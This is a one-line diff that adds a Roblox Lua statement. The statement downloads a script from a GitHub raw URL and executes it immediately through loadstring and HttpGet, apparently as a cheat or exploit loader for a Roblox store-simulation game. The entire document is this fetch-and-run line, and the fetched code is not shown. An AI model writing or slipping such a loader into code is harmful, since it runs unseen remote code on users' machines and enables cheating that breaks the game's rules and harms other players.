@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/run-a-sari-sari-store-spam6-8vewkkypn0ynx5.lua"))()
